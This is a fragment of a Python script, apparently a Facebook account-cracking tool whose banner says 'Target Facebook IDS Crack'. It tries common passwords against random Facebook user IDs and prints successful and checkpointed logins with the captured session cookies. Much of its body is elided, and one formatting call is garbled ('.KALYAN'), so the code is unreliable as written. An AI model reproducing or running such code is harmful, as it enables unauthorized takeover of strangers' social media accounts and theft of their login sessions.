...
def banner():
	...
	print("")
	print("%s"%(Z))
	print("%s%s  Author   : %s                     %s"%(Z,B,M,Z))
	print("%s%s  Github   : -  %s"%(Z,B,Z))
	print("%s%s  Telegram : https://t.me/+LRlET_sIrUcxMTk1      %s"%(Z,B,Z))
	print("%s%s  Version  : %s1.20                          %s"%(Z,B,H,Z))
	print("%s"%(Z))
	print("")
	xox('            %s%s%s%sTarget Facebook IDS Crack%s%s%s'%(M,H,B,H,B,H,M))
	print("")
...
def random_uid():
	...
	print(f' {H}EXAMPLE : 123456,1234567,12345678,Free fire,i love you,REDOY123,priyarani,priyamitro,priyaquan, {N}\n')
	...
	try:
		for pasw in pwx:
			...
			if 'c_user' in fb_cookies:
				...
				uidx = coki[65:80]
				print('\033[1;32m [KALYAN-OK] '+uidx+'|'+pasw+'\033[0;97m')
				...
				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				uidx = coki[82:97]
				print('\033[1;31m [KALYAN-CP] '+uidx+' | '+pasw+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write(f"\r {Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.KALYAN(loop/int(tl))}{Z}]  \r"),
		sys.stdout.flush()
	except:
		pass
